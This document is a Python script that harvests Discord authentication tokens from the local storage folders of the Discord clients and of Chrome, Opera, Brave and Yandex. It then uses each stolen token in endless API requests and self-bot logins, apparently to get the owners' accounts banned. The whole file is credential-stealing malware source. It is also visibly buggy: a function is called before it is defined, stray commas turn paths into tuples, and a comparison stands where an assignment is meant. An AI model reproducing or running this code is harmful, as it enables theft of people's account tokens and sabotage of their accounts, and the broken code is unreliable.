import os
import re
import json
import discord
import asyncio
from discord.ext import commands
import requests

guildid = ""
tokens = []
local = os.getenv('LOCALAPPDATA')
user = os.getenv('USERNAME')
roaming = os.getenv('APPDATA')

path1 = roaming + '\\discord\\Local Storage\\leveldb'
path2 = roaming + '\\discordcanary\\Local Storage\\leveldb',
path3 = roaming + '\\discordptb\\Local Storage\\leveldb',
path4 = local + '\\Google\\Chrome\\User Data\\Default',
path5 = roaming + '\\Opera Software\\Opera Stable',
path6 = local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
path7 = local + '\\Yandex\\YandexBrowser\\User Data\\Default'

if os.path.isdir(str(path1)):
    find_tokens(str(path1))
if os.path.isdir(str(path2)):
    find_tokens(str(path2))
if os.path.isdir(str(path3)):
    find_tokens(str(path3))
if os.path.isdir(str(path4)):
    find_tokens(str(path4))
if os.path.isdir(str(path5)):
    find_tokens(str(path5))
if os.path.isdir(str(path6)):
    find_tokens(str(path6))
if os.path.isdir(str(path7)):
    find_tokens(str(path7))

print("got tokens")

def fuck_token(token):
    while True:
        headers = {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
            "authorization": token
        }
        r2 = requests.get('http://discord.com/api/v8/guilds/' + guildid + '/members', headers=headers)
        print("code: " + str(r2.status_code) + " Account should be banned")


def find_tokens(path):

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

prefix = ""
client = discord.Client()
message = discord.Message 
bot = commands.Bot(command_prefix=prefix, self_bot=True)
@bot.event
async def on_ready():
    for guild in client.guilds:
        guildid == guild.id
    for token in tokens:
        try:
            fuck_token(token)
        except:
            pass

for token in tokens:
    try:
        bot.run(token)
    except:
        pass
